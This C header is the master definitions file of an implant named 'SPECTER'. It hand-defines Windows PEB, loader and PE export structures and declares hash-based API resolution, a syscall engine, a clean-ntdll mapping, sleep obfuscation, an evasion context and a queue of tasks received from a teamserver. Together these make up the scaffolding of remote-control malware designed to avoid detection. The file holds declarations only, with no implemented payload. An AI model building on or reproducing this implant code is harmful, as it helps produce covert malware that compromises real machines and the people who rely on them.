/**
 * SPECTER Implant — Master Header
 *
 * Manual Windows type definitions, PEB/TEB structures, and forward
 * declarations for all core subsystems.  No windows.h dependency.
 */

#ifndef SPECTER_H
#define SPECTER_H

/* ------------------------------------------------------------------ */
/*  Primitive types                                                    */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef long                NTSTATUS;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef short               SHORT;
typedef unsigned short      WCHAR;
typedef char                CHAR;
typedef unsigned char       UCHAR;

typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef void**              PHANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef ULONG*              PULONG;
typedef SIZE_T*             PSIZE_T;
typedef WCHAR*              PWCHAR;
typedef const char*         PCSTR;
typedef const WCHAR*        PCWSTR;
typedef LONG*               PLONG;

/* ------------------------------------------------------------------ */
/*  Constants & macros                                                 */
/* ------------------------------------------------------------------ */

#ifndef NULL
#define NULL            ((void*)0)
#endif
#define TRUE            1
#define FALSE           0
#define NT_SUCCESS(s)   ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000)

#define INVALID_HANDLE_VALUE ((HANDLE)(ULONG_PTR)-1)

/* ------------------------------------------------------------------ */
/*  UNICODE_STRING                                                     */
/* ------------------------------------------------------------------ */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCHAR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

/* ------------------------------------------------------------------ */
/*  LIST_ENTRY                                                         */
/* ------------------------------------------------------------------ */

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

/* ------------------------------------------------------------------ */
/*  LDR_DATA_TABLE_ENTRY  (minimal, x64)                              */
/* ------------------------------------------------------------------ */

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG       Flags;
    USHORT      LoadCount;
    USHORT      TlsIndex;
    LIST_ENTRY  HashLinks;
    ULONG       TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

/* ------------------------------------------------------------------ */
/*  PEB_LDR_DATA                                                       */
/* ------------------------------------------------------------------ */

typedef struct _PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

/* ------------------------------------------------------------------ */
/*  PEB  (minimal fields needed for module resolution, x64)            */
/* ------------------------------------------------------------------ */

typedef struct _PEB {
    BYTE        InheritedAddressSpace;
    BYTE        ReadImageFileExecOptions;
    BYTE        BeingDebugged;
    BYTE        BitField;
    BYTE        Padding0[4];
    PVOID       Mutant;
    PVOID       ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    /* We don't need fields beyond Ldr for module resolution */
} PEB, *PPEB;

/* ------------------------------------------------------------------ */
/*  PE header structures (manual definitions for export parsing)       */
/* ------------------------------------------------------------------ */

typedef struct _IMAGE_DOS_HEADER {
    WORD  e_magic;
    WORD  e_cblp;
    WORD  e_cp;
    WORD  e_crlc;
    WORD  e_cparhdr;
    WORD  e_minalloc;
    WORD  e_maxalloc;
    WORD  e_ss;
    WORD  e_sp;
    WORD  e_csum;
    WORD  e_ip;
    WORD  e_cs;
    WORD  e_lfarlc;
    WORD  e_ovno;
    WORD  e_res[4];
    WORD  e_oemid;
    WORD  e_oeminfo;
    WORD  e_res2[10];
    LONG  e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_EXPORT     0

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD  Magic;
    BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    QWORD ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD  MajorOperatingSystemVersion;
    WORD  MinorOperatingSystemVersion;
    WORD  MajorImageVersion;
    WORD  MinorImageVersion;
    WORD  MajorSubsystemVersion;
    WORD  MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD  Subsystem;
    WORD  DllCharacteristics;
    QWORD SizeOfStackReserve;
    QWORD SizeOfStackCommit;
    QWORD SizeOfHeapReserve;
    QWORD SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion;
    WORD  MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

/* ------------------------------------------------------------------ */
/*  Forward declarations — string subsystem                            */
/* ------------------------------------------------------------------ */

SIZE_T  spec_strlen(const char *s);
SIZE_T  spec_wcslen(const WCHAR *s);
int     spec_strcmp(const char *a, const char *b);
int     spec_wcsicmp(const WCHAR *a, const WCHAR *b);
void*   spec_memcpy(void *dst, const void *src, SIZE_T n);
void*   spec_memmove(void *dst, const void *src, SIZE_T n);
void*   spec_memset(void *dst, int c, SIZE_T n);
int     spec_memcmp(const void *a, const void *b, SIZE_T n);
char*   spec_strcpy(char *dst, const char *src);
char*   spec_strncpy(char *dst, const char *src, SIZE_T n);
char*   spec_strcat(char *dst, const char *src);
char*   spec_strncat(char *dst, const char *src, SIZE_T n);

/* ------------------------------------------------------------------ */
/*  Forward declarations — hash subsystem                              */
/* ------------------------------------------------------------------ */

DWORD   spec_djb2_hash(const char *str);
DWORD   spec_djb2_hash_w(const WCHAR *str);

/* Pre-computed DJB2 hashes for critical DLL names (lowercase) */
#define HASH_NTDLL_DLL      0x22D3B5ED  /* "ntdll.dll"    */
#define HASH_KERNEL32_DLL   0x7040EE75  /* "kernel32.dll" */

/* ------------------------------------------------------------------ */
/*  Forward declarations — PEB / module resolution subsystem           */
/* ------------------------------------------------------------------ */

PPEB    get_peb(void);
PVOID   find_module_by_hash(DWORD hash);
PVOID   find_export_by_hash(PVOID module_base, DWORD hash);
PVOID   resolve_function(DWORD module_hash, DWORD func_hash);

/* ------------------------------------------------------------------ */
/*  Forward declarations — syscall engine subsystem                     */
/* ------------------------------------------------------------------ */

/* Full declarations in syscalls.h; these are for files that only need
   to know the types exist without pulling in the full header. */
typedef struct _SYSCALL_ENTRY   SYSCALL_ENTRY;
typedef struct _SYSCALL_TABLE   SYSCALL_TABLE;

/* ------------------------------------------------------------------ */
/*  Task execution types                                                */
/* ------------------------------------------------------------------ */

#include "task.h"

/* Legacy task type aliases — kept for backward compatibility with
   existing code that uses the old names. New numbering avoids
   collision with the built-in task types (1-4) and CMD (5). */
#define TASK_CMD_EXEC       TASK_TYPE_CMD
#define TASK_SHELLCODE      20  /* Not yet implemented — use modules    */
#define TASK_UPLOAD         21  /* Not yet implemented — use modules    */
#define TASK_DOWNLOAD       22  /* Not yet implemented — use modules    */

/* Maximum pending tasks and results per checkin cycle */
#define MAX_PENDING_TASKS   16
#define MAX_TASK_RESULTS    16

/* Maximum output buffer for command execution (64 KB) */
#define TASK_OUTPUT_MAX     (64 * 1024)

typedef struct _TASK {
    char    task_id[64];        /* UUID from teamserver                */
    DWORD   task_type;          /* TASK_CMD_EXEC, TASK_SHELLCODE, etc. */
    BYTE   *data;               /* Task-specific data (command, etc.)  */
    DWORD   data_len;           /* Length of data                      */
} TASK;

typedef struct _TASK_RESULT {
    char    task_id[64];        /* UUID matching the original task     */
    DWORD   status;             /* 0 = COMPLETE, 1 = FAILED            */
    BYTE   *data;               /* Result data (command output, etc.)  */
    DWORD   data_len;           /* Length of result data                */
} TASK_RESULT;

/* ------------------------------------------------------------------ */
/*  IMPLANT_CONTEXT — top-level global state                            */
/* ------------------------------------------------------------------ */

typedef struct _IMPLANT_CONTEXT {
    SYSCALL_TABLE *syscall_table;   /* Pointer to the syscall cache       */
    PVOID          clean_ntdll;     /* Mapped clean ntdll base            */
    PVOID          config;          /* Implant config (IMPLANT_CONFIG *)     */
    PVOID          comms_ctx;       /* Comms context (COMMS_CONTEXT *)       */
    PVOID          sleep_ctx;       /* Sleep obfuscation context             */
    PVOID          evasion_ctx;     /* Evasion engine context                */
    PVOID          module_bus;      /* Module bus context (BUS_CONTEXT *)    */
    BOOL           running;         /* Implant main loop flag             */

    /* Task queue — filled by parse_checkin_response */
    TASK           pending_tasks[MAX_PENDING_TASKS];
    DWORD          pending_task_count;

    /* Task results — filled by execute_task, sent in next checkin */
    TASK_RESULT    task_results[MAX_TASK_RESULTS];
    DWORD          task_result_count;
} IMPLANT_CONTEXT;

#endif /* SPECTER_H */
